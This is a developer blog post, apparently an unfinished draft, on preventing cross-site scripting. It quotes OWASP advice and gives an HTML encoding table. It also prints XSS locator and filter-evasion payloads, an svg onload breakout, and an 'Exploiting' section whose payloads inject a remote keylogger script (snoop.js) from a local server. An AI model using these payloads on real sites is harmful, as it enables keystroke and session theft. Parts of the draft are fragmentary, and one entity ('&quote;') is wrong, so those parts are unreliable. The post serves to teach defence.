---
layout: posts
title: "5 Takeaways to rid your site from XSS vulnerabilities"
description: "If you are a developer, you need to take security very seriously and here is why"
keywords: "xss, cross site scripting, hacking, vulnerability, scripting"
date: 2014-10-09 23:13
categories: ['blog']
tags: ['security']
comments: true
meta: true
image:
  feature: covers/xss-security.jpg
  bg_style: 'background-position: left; background-size: contain; background-repeat: no-repeat; background-color: #000C14;'
quote:
    text: "When solving problems, dig at the roots instead of just hacking at the leaves."
    title: The College Blue Book
    author: Anthony J. D'Angelo
---
Every couple of years ["The Open Web Application Security Project" (OWASP)][6] publishes its [Top 10 list][1] of most
prevalent web application security flaws and often people complain that nothing new has come up. There in itself lies
a **problem**, and as rightful developers we need to take heed of this anti-pattern and do something about it.

One of those ever present vulnerabilities that is always likely to exist on a website most of the time is
Cross-site scripting (XSS)[^1].

[**Cross-site scripting (XSS)**][5] is the most prevalent web application security flaw. **XSS** flaws occur when an
application includes user supplied data in a page sent to the browser without properly validating or escaping that
content.
{: .alert.alert-warning }

Even though the move to modern development frameworks such as .NET, which provide automatic protection against this
vulnerability amongst others, has removed a lot of the onus on developers to understand its technical detail, lack of
understanding of security flaws and the increase in client side code are two areas that IMO continues to keep XSS at
the top of the security flaws list.

> It is a technical debt that you will have to pay sooner or later.

Whilst tasked to fix XSS security holes in a legacy application that I was supporting, the exercise was so
daunting and time consuming that it made me firm up my belief that security indeed needs to be taken very seriously.
It is a technical debt that you will have to pay sooner or later.

There are automated tools that can find and identify XSS problems automatically. However because every application
builds output pages differently &mdash; with a mixture of server and client side &mdash; automated detection has
become very difficult. It is only with code review (requiring strong implementation awareness) and laborious manual
regression testing that a level of near complete coverage can be achieved.

So don't let things slip this far in your current development. **Update your project's [DoD][7]** and add specific
references to security as a first step.

In the mean time, I share with you 5 key takeaways from my sprint of learning to comprehensively prevent XSS
taking place on your site.

## 1. Encoding
Input is left as is, and not santized. For a system that already exists in Production, think about the content
that has already been entered by users already.


* Different encoding types exist
* Attribute encoding, Content encoding

> But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event
handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method
everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML
document you're putting untrusted data into. That's what the rules below are all about.
https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

## 2. Locator Strings

~~~
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
~~~

~~~
'';!--"<XSS>=&{()}
~~~


## 3. White list HREF SRC attributes
Positive or “whitelist” input validation is also recommended as it helps protect against XSS, but is not a complete
defense as many applications require special characters in their input. Such validation should, as much as possible,
validate the length, characters, format, and business rules on that data before accepting the input.


```
// Embedded tab
<IMG SRC="jav	ascript:alert('XSS');">

// Embedded Encoded tab
<IMG SRC="jav&#x09;ascript:alert('XSS');">

// Embedded carriage return to break up XSS
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

```

## 4. E
// 4 - How to exploit a XSS vulnerable site
* Using <svg onload="..." />
* Using <img onload="..." />
* Passing in query string
* Using bit.ly to obfuscate a URL, or HTML encoding - its getting easy to get users to click on malciious links because of url shorterning
* Breaking the code

```
function escape(input) {
    return '<input type="text" value="' + input + '">';
}
```

```
"><svg onload="alert('hello world');">
```

// 5 Context




Character | HTML Encoding |
----------|:--------------|
& | `&amp;`
< | `&lt;`
> | `&gt;`
" | `&quote;`
' | `&#x27`
/ | `&#x2F;`



#### XSS Locator


{% highlight javascript %}
javascript:alert(‘hello’);
java&#010;script:alert(‘hello’);

// Embedded tab
jav	ascript:alert('hello');

// Embedded newline to break up XSS
java&#X0A;script:alert(‘hello’);
{% endhighlight %}

Ref: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet


# Exploiting
```
// Embed and execute client side script by using a script tag if it is allowed in XSS vulnerable web page
<script src="http://localhost:3000/snoop.js"></script>

// Encode special tags to HTML code to bypass sites with simple inadequate encoding of special tags only
&#060;script src="http://localhost:3000/snoop.js"&#062;&#060;/script&#062;
```

Some sites will prevent any `<script>` tags to be embedded or posted in their input fields. In that case, you
could try to embed and run xss-keylogger client side script as part of the `onload` attribute of an `svg` element.
```
<svg onload="http://localhost:3000/snoop.js" />


var d=document;var s=d.createElement('script');s.type='text/javascript';s.src='http://localhost:3000/snoop.js';var h=d.getElementsByTagName('head')[0];h.appendChild(s);

function loadScript(url, callback) {
        // Adding the script tag to the head as suggested before
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
        script.onreadystatechange = callback;
        script.onload = callback;

        // Fire the loading
        head.appendChild(script);
    }
```

## How to get it right
To improve my own knowledge on this domain, I thought I'd try and learn how to hack. It turned out to be a lot of
fun whilst at it.

Just wanted to move on from the `alert` messages that most XSS demonstrations show. Own complete application.
// Talk about XSS Keylogger and the learning
// For something more fletched out, [Browser Exploitation Framework (BeEF)][3]

Heaps of other methods. Suggest that you listen to [Application Security for RIAS][4] that demonstrats CSRF and even ClickJacking which I am
tempted to try on my site and see if it has any effects increasing the number of followers on my twitter - just kidding!

## References:
[^1]: [Whitehat Security Report][2] shows that XSS is second most likely vulnerability to exist on a website at 53%
just behind Information Leakage (55%).

* https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml
* http://prompt.ml/0

[1]: https://www.owasp.org/index.php/Top_10_2013-Top_10
[2]: https://www.whitehatsec.com/assets/WPstatsReport_052013.pdf
[3]: http://beefproject.com
[4]: http://www.sencha.com/conference/session/application-security-for-rias
[5]: http://en.wikipedia.org/wiki/Cross-site_scripting
[6]: https://www.owasp.org/index.php/About_OWASP
[7]: https://www.scrum.org/Resources/Scrum-Glossary/Definition-of-Done